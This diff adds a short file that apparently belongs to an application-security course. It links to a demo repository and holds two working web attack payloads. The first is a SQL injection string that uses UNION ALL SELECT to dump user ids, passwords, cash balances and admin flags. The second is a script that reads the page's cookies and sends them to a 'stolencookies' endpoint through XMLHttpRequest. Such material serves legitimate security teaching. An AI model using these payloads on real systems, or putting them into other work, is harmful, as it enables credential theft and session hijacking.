@@ -1,0 +1,8 @@
+1' UNION ALL SELECT id, password, name, public_id, cash_amount, admin FROM user;--
+https://gitlab.com/frgagnon/appsecdemo_start_a2022/-/tree/week1_startingpoint
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://127.0.0.1:5558/stolencookies?cookies=" + document.cookie, true);
+xhr.send();
+</script>
